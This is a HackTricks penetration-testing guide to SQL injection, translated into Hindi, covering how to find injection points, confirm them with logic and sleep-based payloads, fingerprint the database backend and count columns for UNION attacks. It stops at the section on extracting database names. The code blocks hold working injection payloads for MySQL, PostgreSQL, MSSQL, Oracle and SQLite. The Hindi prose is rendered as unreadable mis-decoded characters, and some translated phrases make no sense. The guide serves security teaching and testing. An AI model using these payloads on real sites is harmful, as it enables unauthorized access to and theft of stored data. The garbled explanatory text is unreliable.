# SQL Injection

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк рдХрд┐рд╕реА **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреА рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб** рдХрд░рдиреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* рдЦреЛрдЬреЗрдВ [**The PEASS Family**](https://opensea.io/collection/the-peass-family), рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ рд╕рдВрдЧреНрд░рд╣ [**NFTs**](https://opensea.io/collection/the-peass-family)
* рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ рдпрд╛ рдореБрдЭреЗ **Twitter** [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)** рдХрд╛ рдкрд╛рд▓рди рдХрд░реЗрдВ**.
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ** [hacktricks repo](https://github.com/carlospolop/hacktricks) рдФрд░ [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud) рдореЗрдВ PR рдЬрдорд╛ рдХрд░рдХреЗред

</details>

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

тАЛтАЛтАЛтАЛ[**RootedCON**](https://www.rootedcon.com/) рд╕реНрдкреЗрди рдореЗрдВ рд╕рдмрд╕реЗ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдЗрд╡реЗрдВрдЯ рд╣реИ рдФрд░ рдпреВрд░реЛрдк рдореЗрдВ рд╕рдмрд╕реЗ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдореЗрдВ рд╕реЗ рдПрдХ рд╣реИред рддрдХрдиреАрдХреА рдЬреНрдЮрд╛рди рдХреЛ рдмрдврд╝рд╛рд╡рд╛ рджреЗрдиреЗ рдХреА рдорд┐рд╢рди рдХреЗ рд╕рд╛рде, рдпрд╣ рдХрд╛рдВрдЧреНрд░реЗрд╕ рдкреНрд░реМрджреНрдпреЛрдЧрд┐рдХреА рдФрд░ рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рд╡рд┐рд╢реЗрд╖рдЬреНрдЮреЛрдВ рдХреЗ рд▓рд┐рдП рдПрдХ рдЙрдмрд▓рддрд╛ рд╣реБрдЖ рдорд┐рд▓рди рд╕реНрдерд▓ рд╣реИред

{% embed url="https://www.rootedcon.com/" %}

## SQL Injection рдХреНрдпрд╛ рд╣реИ?

SQL Injection рдПрдХ рд╡реЗрдм рд╕реБрд░рдХреНрд╖рд╛ рд╕рдВрдХрдЯ рд╣реИ рдЬреЛ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ **рд╡реЗрдм рдПрдкреНрд▓рд┐рдХреЗрд╢рди** рдХреЗ **рдбреЗрдЯрд╛рдмреЗрд╕** рдХреЗ рд╕рд╛рде рдЙрд╕рдХреЗ **рдХреНрд╡реЗрд░реА** рдореЗрдВ **рд╣рд╕реНрддрдХреНрд╖реЗрдк** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред рдпрд╣ рдЖрдорддреМрд░ рдкрд░ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рдЙрд╕ рдбреЗрдЯрд╛ рдХреЛ **рджреЗрдЦрдиреЗ** рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ рдЬрд┐рд╕реЗ рд╡рд╣ рд╕рд╛рдорд╛рдиреНрдпрддрдГ рдкреНрд░рд╛рдкреНрдд рдирд╣реАрдВ рдХрд░ рд╕рдХрддрд╛ рд╣реИред рдЗрд╕рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ **рдЕрдиреНрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ** рдХреЗ рдбреЗрдЯрд╛, рдпрд╛ рдХрд┐рд╕реА рднреА рдЕрдиреНрдп рдбреЗрдЯрд╛ рдЬрд┐рд╕реЗ **рдПрдкреНрд▓рд┐рдХреЗрд╢рди** рдЦреБрдж рдХреЗ **рдЙрдкрдпреЛрдЧ** рдХрд░ рд╕рдХрддрд╛ рд╣реИред рдмрд╣реБрдд рд╕реЗ рдорд╛рдорд▓реЛрдВ рдореЗрдВ, рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЗрд╕ рдбреЗрдЯрд╛ рдХреЛ **рд╕рдВрд╢реЛрдзрд┐рдд** рдпрд╛ **рд╣рдЯрд╛ рд╕рдХрддрд╛ рд╣реИ**, рдЬрд┐рд╕рд╕реЗ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреА рд╕рд╛рдордЧреНрд░реА рдпрд╛ рд╡реНрдпрд╡рд╣рд╛рд░ рдореЗрдВ рд╕реНрдерд╛рдпреА рдкрд░рд┐рд╡рд░реНрддрди рд╣реЛрддрд╛ рд╣реИред\
рдХреБрдЫ рд╕реНрдерд┐рддрд┐рдпреЛрдВ рдореЗрдВ, рдПрдХ рд╣рдорд▓рд╛рд╡рд░ SQL Injection рд╣рдорд▓реЗ рдХреЛ **рдЖрдзрд╛рд░рднреВрдд рд╕рд░реНрд╡рд░** рдпрд╛ рдЕрдиреНрдп рдкреАрдЫреЗ рдХреА рдврд╛рд▓ рдмреБрдирд┐рдпрд╛рджреА рд╕рдВрд░рдЪрдирд╛ рдХреЛ рдЦрддрд░реЗ рдореЗрдВ рдбрд╛рд▓рдиреЗ, рдпрд╛ рдПрдХ рд╡рд┐рд╡рд░рдг-рд╕реЗ-рд╕реЗрд╡рд╛ рд╣рдорд▓рд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдмрдврд╝рд╛ рд╕рдХрддрд╛ рд╣реИред (рдпрд╣рд╛рдВ рд╕реЗ рд▓рд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ [рдпрд╣рд╛рдВ](https://portswigger.net/web-security/sql-injection))ред

> рдЗрд╕ рдкреЛрд╕реНрдЯ рдореЗрдВ рдореИрдВ рдорд╛рди рд▓реЗрддрд╛ рд╣реВрдВ рдХрд┐ рд╣рдореЗрдВ рдПрдХ рд╕рдВрднрд╛рд╡рд┐рдд SQL Injection рдорд┐рд▓ рдЧрдпрд╛ рд╣реИ рдФрд░ рд╣рдо рд╕рдВрднрд╛рд╡рд┐рдд рддрд░реАрдХреЛрдВ рдХреА рдЪрд░реНрдЪрд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрд╕реЗ рдкреБрд╖реНрдЯрд┐ рдХрд░рдиреЗ, рдбреЗрдЯрд╛рдмреЗрд╕ рдХрд╛ рдкреБрдирд░реНрдирд┐рд░реНрдзрд╛рд░рдг рдХрд░рдиреЗ рдФрд░ рдХрд╛рд░реНрд░рд╡рд╛рдИ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╡рд┐рдЪрд╛рд░ рдХрд░реЗрдВрдЧреЗред

## рдкреНрд░рд╡реЗрд╢ рдмрд┐рдВрджреБ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдирд╛

рдЖрдкрдиреЗ рд╢рд╛рдпрдж рдПрдХ рд╕рд╛рдЗрдЯ рдХреЛ рдЦреЛрдЬрд╛ рд╣реЛрдЧрд╛ рдЬреЛ SQLi рд╕рдВрдмрдВрдзрд┐рдд рдЗрдирдкреБрдЯ рдХреЗ рд╕рд╛рде рдЕрдЬреАрдм рддрд░реАрдХреЗ рд╕реЗ рд╡реНрдпрд╡рд╣рд╛рд░ рдХрд░ рд░рд╣реА рд╣реИ, рдЗрд╕рд▓рд┐рдП **рдкрд╣рд▓реА рдЪреАрдЬ** рдЬреЛ рдЖрдкрдХреЛ рдХрд░рдиреА рд╣реЛрдЧреА рд╡рд╣ рд╣реИ рдХрд┐ рдЖрдкрдХреЛ рдкрддрд╛ рдЪрд▓реЗ рдХрд┐ рдХреИрд╕реЗ **рдХреНрд╡реЗрд░реА рдореЗрдВ рдбреЗрдЯрд╛ рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░реЗрдВ рдмрд┐рдирд╛ рдЙрд╕реЗ рддреЛрдбрд╝рддреЗ рд╣реБрдПред** рдЗрд╕рдХреЗ рд▓рд┐рдП, рдЖрдкрдХреЛ рдкрд╣рд▓реЗ рдпрд╣ рдЬрд╛рдирдирд╛ рд╣реЛрдЧрд╛ рдХрд┐ **рд╡рд░реНрддрдорд╛рди рд╕рдВрджрд░реНрдн рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓реЗрдВ** рдХреИрд╕реЗ рдХрд░реЗрдВред\
рдпреЗ рдХреБрдЫ рдЙрдкрдпреЛрдЧреА рдЙрджрд╛рд╣рд░рдг рд╣реИрдВ:
```
[Nothing]
'
"
`
')
")
`)
'))
"))
`))
```
рддреЛ, рдЖрдкрдХреЛ рдпрд╣ рдЬрд╛рдирдирд╛ рдЪрд╛рд╣рд┐рдП рдХрд┐ рдХреИрд╕реЗ **рд╡рд┐рдЪрд╛рд░рд╢реАрд▓реА рддрд░реАрдХреЗ рд╕реЗ рдХреНрд╡реЗрд░реА рдХреЛ рд╕реБрдзрд╛рд░реЗрдВ**ред рдХреНрд╡реЗрд░реА рдХреЛ рд╕реБрдзрд╛рд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк **рдбреЗрдЯрд╛ рдЗрдирдкреБрдЯ** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ **рдкрд┐рдЫрд▓реА рдХреНрд╡реЗрд░реА рдирдП рдбреЗрдЯрд╛ рдХреЛ рд╕реНрд╡реАрдХрд╛рд░ рдХрд░реЗрдВ**, рдпрд╛ рдЖрдк рдЕрдкрдиреЗ рдбреЗрдЯрд╛ рдХреЛ **рдЗрдирдкреБрдЯ** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ **рдПрдХ рдЯрд┐рдкреНрдкрдгреА рдЪрд┐рдиреНрд╣ рдЕрдВрдд рдореЗрдВ рдЬреЛрдбрд╝ рд╕рдХрддреЗ рд╣реИрдВ**ред

_рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрджрд┐ рдЖрдк рддреНрд░реБрдЯрд┐ рд╕рдВрджреЗрд╢ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдпрд╛ рдЖрдк рдХреНрд╡реЗрд░реА рдХрд╛рдо рдХрд░ рд░рд╣реА рд╣реИ рдФрд░ рдЬрдм рдирд╣реАрдВ рд╣реИ рддреЛ рдпрд╣ рдЪрд░рдг рдЖрд╕рд╛рди рд╣реЛ рдЬрд╛рдПрдЧрд╛ред_

### **рдЯрд┐рдкреНрдкрдгрд┐рдпрд╛рдБ**
```sql
MySQL
#comment
-- comment     [Note the space after the double dash]
/*comment*/
/*! MYSQL Special SQL */

PostgreSQL
--comment
/*comment*/

MSQL
--comment
/*comment*/

Oracle
--comment

SQLite
--comment
/*comment*/

HQL
HQL does not support comments
```
### рддрд╛рд░реНрдХрд┐рдХ рд╕рдВрдЪрд╛рд▓рди рдХреЗ рд╕рд╛рде рдкреБрд╖реНрдЯрд┐ рдХрд░рдирд╛

SQL рдЗрдВрдЬреЗрдХреНрд╢рди рдХреА рдкреБрд╖реНрдЯрд┐ рдХрд░рдиреЗ рдХрд╛ рд╕рдмрд╕реЗ рдЕрдЪреНрдЫрд╛ рддрд░реАрдХрд╛ рд╣реИ рдЙрд╕реЗ рдПрдХ **рддрд╛рд░реНрдХрд┐рдХ рд╕рдВрдЪрд╛рд▓рди** рдХреЛ рд╕рдВрдЪрд╛рд▓рд┐рдд рдХрд░рдирд╛ рдФрд░ рдЙрдореНрдореАрджрд┐рдд рдкрд░рд┐рдгрд╛рдо рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛ред
рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП: рдпрджрд┐ GET рдкреИрд░рд╛рдореАрдЯрд░ `?username=Peter` `?username=Peter' or '1'='1` рдХреЗ рд░реВрдк рдореЗрдВ рд╕рдорд╛рди рд╕рд╛рдордЧреНрд░реА рд▓реМрдЯрд╛рддрд╛ рд╣реИ, рддреЛ рдЖрдкрдиреЗ рдПрдХ SQL рдЗрдВрдЬреЗрдХреНрд╢рди рдЦреЛрдЬ рд▓рд┐рдпрд╛ рд╣реИред

рдЗрд╕ рдЕрд╡рдзрд╛рд░рдгрд╛ рдХреЛ **рдЧрдгрд┐рддреАрдп рд╕рдВрдЪрд╛рд▓рди** рдкрд░ рднреА рд▓рд╛рдЧреВ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдЙрджрд╛рд╣рд░рдг: рдпрджрд┐ `?id=1` `?id=2-1` рдХреЗ рд░реВрдк рдореЗрдВ рд╕рдорд╛рди рд▓реМрдЯрддрд╛ рд╣реИ, рддреЛ рдпрд╣ SQL рдЗрдВрдЬреЗрдХреНрд╢рди рд╣реИред
```
page.asp?id=1 or 1=1 -- true
page.asp?id=1' or 1=1 -- true
page.asp?id=1" or 1=1 -- true
page.asp?id=1 and 1=2 -- false
```
рдпрд╣ рд╡рд░реНрдб-рд▓рд┐рд╕реНрдЯ SQL рдЗрдВрдЬреЗрдХреНрд╢рди рдХреА рдкреБрд╖реНрдЯрд┐ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдмрдирд╛рдИ рдЧрдИ рдереА рдЬрд┐рд╕реЗ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рддрд░реАрдХреЗ рд╕реЗ рдкреНрд░рдорд╛рдгрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:

{% file src="../../.gitbook/assets/sqli-logic.txt" %}

### рд╕рдордп рдХреЗ рд╕рд╛рде рдкреБрд╖реНрдЯрд┐ рдХрд░рдирд╛

рдХреБрдЫ рдорд╛рдорд▓реЛрдВ рдореЗрдВ, рдЖрдк рдЬрд┐рд╕ рдкреГрд╖реНрда рдХрд╛ рдкрд░реАрдХреНрд╖рдг рдХрд░ рд░рд╣реЗ рд╣реИрдВ, рдЙрд╕ рдкрд░ рдХреЛрдИ рднреА рдкрд░рд┐рд╡рд░реНрддрди рдирд╣реАрдВ рджреЗрдЦреЗрдВрдЧреЗред рдЗрд╕рд▓рд┐рдП, рдмреНрд▓рд╛рдЗрдВрдб SQL рдЗрдВрдЬреЗрдХреНрд╢рди рдХреА рдЦреЛрдЬ рдХрд░рдиреЗ рдХрд╛ рдПрдХ рдЕрдЪреНрдЫрд╛ рддрд░реАрдХрд╛ рд╣реИ рдХрд┐ рдбреЗрдЯрд╛рдмреЗрд╕ рдХреЛ рдХрд╛рд░реНрд░рд╡рд╛рдИ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдмрд╛рдзреНрдп рдХрд┐рдпрд╛ рдЬрд╛рдП рдФрд░ рдЗрд╕рдХрд╛ рдкреГрд╖реНрда рд▓реЛрдб рд╣реЛрдиреЗ рдореЗрдВ рд╕рдордп рд▓рдЧреЗрдЧрд╛ред\
рдЗрд╕рд▓рд┐рдП, рд╣рдо SQL рдХреНрд╡реЗрд░реА рдореЗрдВ рдПрдХ рдРрд╕рд╛ рд╕рдВрдпреЛрдЬрди рдХрд░реЗрдВрдЧреЗ рдЬрд┐рд╕реЗ рдкреВрд░рд╛ рдХрд░рдиреЗ рдореЗрдВ рдмрд╣реБрдд рд╕рдордп рд▓рдЧреЗрдЧрд╛:
```
MySQL (string concat and logical ops)
1' + sleep(10)
1' and sleep(10)
1' && sleep(10)
1' | sleep(10)

PostgreSQL (only support string concat)
1' || pg_sleep(10)

MSQL
1' WAITFOR DELAY '0:0:10'

Oracle
1' AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])
1' AND 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',10)

SQLite
1' AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
1' AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
```
рдХреБрдЫ рдорд╛рдорд▓реЛрдВ рдореЗрдВ **рдиреАрдВрдж рдлрд╝рдВрдХреНрд╢рдиреНрд╕ рдХреА рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рд╣реЛрдЧреА**ред рдлрд┐рд░, рдЗрди рдлрд╝рдВрдХреНрд╢рдиреНрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рдмрдЬрд╛рдп рдЖрдк рдХреНрд╡реЗрд░реА рдХреЛ **рдЬрдЯрд┐рд▓ рд╕рдВрдЪрд╛рд▓рди** рдХрд░рд╛ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рдХрдИ рд╕реЗрдХрдВрдб рд▓реЗ рд╕рдХрддрд╛ рд╣реИред _рдЗрди рддрдХрдиреАрдХреЛрдВ рдХреЗ рдЙрджрд╛рд╣рд░рдг рдЕрд▓рдЧ-рдЕрд▓рдЧ рдкреНрд░реМрджреНрдпреЛрдЧрд┐рдХрд┐рдпреЛрдВ рдкрд░ рдЕрд▓рдЧ-рдЕрд▓рдЧ рдЯрд┐рдкреНрдкрдгрд┐рдпреЛрдВ рдореЗрдВ рджрд┐рдП рдЬрд╛рдПрдВрдЧреЗ (рдпрджрд┐ рдХреЛрдИ рд╣реЛ)_ред

### рдмреИрдХ-рдПрдВрдб рдХреА рдкрд╣рдЪрд╛рди рдХрд░рдирд╛

рдмреИрдХ-рдПрдВрдб рдХреА рдкрд╣рдЪрд╛рди рдХрд░рдиреЗ рдХрд╛ рд╕рдмрд╕реЗ рдЕрдЪреНрдЫрд╛ рддрд░реАрдХрд╛ рд╣реИ рд╡рд┐рднрд┐рдиреНрди рдмреИрдХ-рдПрдВрдб рдХреЗ рдлрд╝рдВрдХреНрд╢рдиреНрд╕ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рдирд╛ред рдЖрдк рдкрд┐рдЫрд▓реЗ рдЦрдВрдб рдореЗрдВ рджрд┐рдП рдЧрдП _**рдиреАрдВрдж**_ **рдлрд╝рдВрдХреНрд╢рдиреНрд╕** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдпрд╛ рдЗрдирдореЗрдВ рд╕реЗ рдпреЗ рднреА:
```bash
["conv('a',16,2)=conv('a',16,2)"                   ,"MYSQL"],
["connection_id()=connection_id()"                 ,"MYSQL"],
["crc32('MySQL')=crc32('MySQL')"                   ,"MYSQL"],
["BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)"       ,"MSSQL"],
["@@CONNECTIONS>0"                                 ,"MSSQL"],
["@@CONNECTIONS=@@CONNECTIONS"                     ,"MSSQL"],
["@@CPU_BUSY=@@CPU_BUSY"                           ,"MSSQL"],
["USER_ID(1)=USER_ID(1)"                           ,"MSSQL"],
["ROWNUM=ROWNUM"                                   ,"ORACLE"],
["RAWTOHEX('AB')=RAWTOHEX('AB')"                   ,"ORACLE"],
["LNNVL(0=123)"                                    ,"ORACLE"],
["5::int=5"                                        ,"POSTGRESQL"],
["5::integer=5"                                    ,"POSTGRESQL"],
["pg_client_encoding()=pg_client_encoding()"       ,"POSTGRESQL"],
["get_current_ts_config()=get_current_ts_config()" ,"POSTGRESQL"],
["quote_literal(42.5)=quote_literal(42.5)"         ,"POSTGRESQL"],
["current_database()=current_database()"           ,"POSTGRESQL"],
["sqlite_version()=sqlite_version()"               ,"SQLITE"],
["last_insert_rowid()>1"                           ,"SQLITE"],
["last_insert_rowid()=last_insert_rowid()"         ,"SQLITE"],
["val(cvar(1))=1"                                  ,"MSACCESS"],
["IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0"               ,"MSACCESS"],
["cdbl(1)=cdbl(1)"                                 ,"MSACCESS"],
["1337=1337",   "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
["'i'='i'",     "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
```
рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рдХреНрд╡реЗрд░реА рдХреЗ рдЖрдЙрдЯрдкреБрдЯ рддрдХ рдкрд╣реБрдВрдЪ рд╣реИ, рддреЛ рдЖрдк рдЗрд╕реЗ **рдбреЗрдЯрд╛рдмреЗрд╕ рдХреЗ рд╕рдВрд╕реНрдХрд░рдг рдХреЛ рдкреНрд░рд┐рдВрдЯ рдХрд░рдиреЗ** рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

{% hint style="info" %}
рдПрдХ рдЖрдЧреЗ рдмрдврд╝рддреЗ рд╣реБрдП рд╣рдо рд╡рд┐рднрд┐рдиреНрди рдкреНрд░рдХрд╛рд░ рдХреЗ SQL Injection рдХреЛ рдЙрддреНрдкрдиреНрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╡рд┐рднрд┐рдиреНрди рддрдХрдиреАрдХреЛрдВ рдкрд░ рдЪрд░реНрдЪрд╛ рдХрд░реЗрдВрдЧреЗред рд╣рдо MySQL рдХрд╛ рдЙрдкрдпреЛрдЧ рдЙрджрд╛рд╣рд░рдг рдХреЗ рд░реВрдк рдореЗрдВ рдХрд░реЗрдВрдЧреЗред
{% endhint %}

### PortSwigger рдХреЗ рд╕рд╛рде рдкрд╣рдЪрд╛рди рдХрд░рдирд╛

{% embed url="https://portswigger.net/web-security/sql-injection/cheat-sheet" %}

## Union Based рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛

### рдХреЙрд▓рдореЛрдВ рдХреА рд╕рдВрдЦреНрдпрд╛ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдирд╛

рдпрджрд┐ рдЖрдк рдХреНрд╡реЗрд░реА рдХреЗ рдЖрдЙрдЯрдкреБрдЯ рдХреЛ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рдЗрд╕реЗ рдЙрддреНрдкрдиреНрди рдХрд░рдиреЗ рдХрд╛ рдпрд╣ рд╕рдмрд╕реЗ рдЕрдЪреНрдЫрд╛ рддрд░реАрдХрд╛ рд╣реИред\
рд╕рдмрд╕реЗ рдкрд╣рд▓реЗ, рд╣рдореЗрдВ рдпрд╣ рдЬрд╛рдирдирд╛ рд╣реЛрдЧрд╛ рдХрд┐ **рдкреНрд░рд╛рд░рдВрднрд┐рдХ рдЕрдиреБрд░реЛрдз** рдХрд┐рддрдиреЗ **рдХреЙрд▓рдо** рд▓реМрдЯрд╛ рд░рд╣рд╛ рд╣реИред рдЗрд╕рд▓рд┐рдП **рджреЛрдиреЛрдВ рдХреНрд╡реЗрд░реА рдХреЛ рдПрдХ рд╣реА рд╕рдВрдЦреНрдпрд╛ рдХреЗ рдХреЙрд▓рдо рд▓реМрдЯрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП**ред\
рдЗрд╕ рдЙрджреНрджреЗрд╢реНрдп рдХреЗ рд▓рд┐рдП рдЖрдорддреМрд░ рдкрд░ рджреЛ рддрд░реАрдХреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ:

#### Order/Group by

рдЭреВрд▓рддреЗ рд░рд╣реЗрдВрдЧреЗ рдЬрдм рддрдХ рдЖрдкрдХреЛ рдПрдХ рдЧрд▓рдд рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдирд╣реАрдВ рдорд┐рд▓рддреА рд╣реИред рд╣рд╛рд▓рд╛рдВрдХрд┐, GROUP BY рдФрд░ ORDER BY рджреЛрдиреЛрдВ SQL рдореЗрдВ рдЕрд▓рдЧ-рдЕрд▓рдЧ рдХрд╛рд░реНрдпрдХреНрд╖рдорддрд╛ рд╣реЛрддреА рд╣реИ, рд▓реЗрдХрд┐рди рд╡реЗ рджреЛрдиреЛрдВ рдХреНрд╡реЗрд░реА рдореЗрдВ рдХреЙрд▓рдореЛрдВ рдХреА рд╕рдВрдЦреНрдпрд╛ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рд╣реА рддрд░реАрдХреЗ рд╕реЗ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВред
```sql
1' ORDER BY 1--+    #True
1' ORDER BY 2--+    #True
1' ORDER BY 3--+    #True
1' ORDER BY 4--+    #False - Query is only using 3 columns
#-1' UNION SELECT 1,2,3--+    True
```

```sql
1' GROUP BY 1--+    #True
1' GROUP BY 2--+    #True
1' GROUP BY 3--+    #True
1' GROUP BY 4--+    #False - Query is only using 3 columns
#-1' UNION SELECT 1,2,3--+    True
```
#### UNION SELECT

рдпрд╣рд╛рдВ рддрдХ рдХрд┐ рдХреНрд╡реЗрд░реА рд╕рд╣реА рд╣реЛ рдЬрд╛рдП, рдФрд░ рдЬреНрдпрд╛рджрд╛ рдФрд░ рдЬреНрдпрд╛рджрд╛ null рдорд╛рдиреЛрдВ рдХреЛ рдЪреБрдиреЗрдВ:
```sql
1' UNION SELECT null-- - Not working
1' UNION SELECT null,null-- - Not working
1' UNION SELECT null,null,null-- - Worked
```
_рдЖрдкрдХреЛ рдХреБрдЫ рдорд╛рдорд▓реЛрдВ рдореЗрдВ `null` рдорд╛рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП рдХреНрдпреЛрдВрдХрд┐ рдХреБрдЫ рдорд╛рдорд▓реЛрдВ рдореЗрдВ рдХреНрд╡реЗрд░реА рдХреЗ рджреЛрдиреЛрдВ рдкрдХреНрд╖реЛрдВ рдХреЗ рд╕реНрддрдВрдн рдХреЗ рдкреНрд░рдХрд╛рд░ рд╕рдорд╛рди рд╣реЛрдиреЗ рдЪрд╛рд╣рд┐рдП рдФрд░ рд╣рд░ рдорд╛рдорд▓реЗ рдореЗрдВ `null` рдорд╛рди рдорд╛рдиреНрдп рд╣реИред_

### рдбреЗрдЯрд╛рдмреЗрд╕ рдирд╛рдо, рдЯреЗрдмрд▓ рдирд╛рдо рдФрд░ рдХреЙрд▓рдо рдирд╛рдо рдирд┐рдХрд╛рд▓реЗрдВ

